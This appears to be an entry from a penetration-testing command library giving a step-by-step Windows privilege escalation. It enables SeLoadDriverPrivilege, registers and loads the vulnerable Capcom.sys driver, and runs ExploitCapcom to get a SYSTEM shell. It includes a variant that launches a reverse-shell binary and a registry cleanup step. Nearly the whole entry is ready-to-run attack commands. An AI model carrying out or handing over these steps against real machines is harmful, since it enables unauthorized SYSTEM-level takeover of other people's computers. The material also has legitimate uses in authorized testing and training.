---
description: |
  This document provides a step-by-step guide to enable SeLoadDriverPrivilege and exploit Capcom.sys to obtain a SYSTEM shell on Windows.
  
command: |
  whoami /priv | findstr "SeLoadDriverPrivilege"
  
code: |

  ## Enable SeLoadDriverPrivilege and Prepare the Capcom.sys Exploit

  1. **Compile the Privilege Enabler**

         cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

  2. **Download and Configure Capcom.sys**

         reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
         reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

  3. **Verify the Driver is Not Already Loaded**

         .\DriverView.exe /stext drivers.txt
         cat drivers.txt | Select-String -pattern Capcom

  4. **Enable the Privilege**

         EnableSeLoadDriverPrivilege.exe
         whoami /priv

  5. **Verify Capcom.sys is Loaded**

         .\DriverView.exe /stext drivers.txt
         cat drivers.txt | Select-String -pattern Capcom

  6. **Exploit Capcom.sys to Escalate Privileges**

         .\ExploitCapcom.exe

     **Alternate Exploitation (No GUI):**

         Modify ExploitCapcom.cpp:
             Replace:
                 TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
             With:
                 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
         Recompile and run the tool.

  7. **Automate with EoPLoadDriver (Optional)**

         EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys

  8. **Cleanup**

         reg delete HKCU\System\CurrentControlSet\CAPCOM

items:
  -
services:
  -
OS:
  - Windows
attack_types:
  - Enumeration
  - Privilege Escalation
references:
  - http://www.nirsoft.net/utils/driverview.html
  - https://github.com/tandasat/ExploitCapcom
  - https://github.com/TarlogicSecurity/EoPLoadDriver/
  - https://github.com/hfiref0x/UACME
---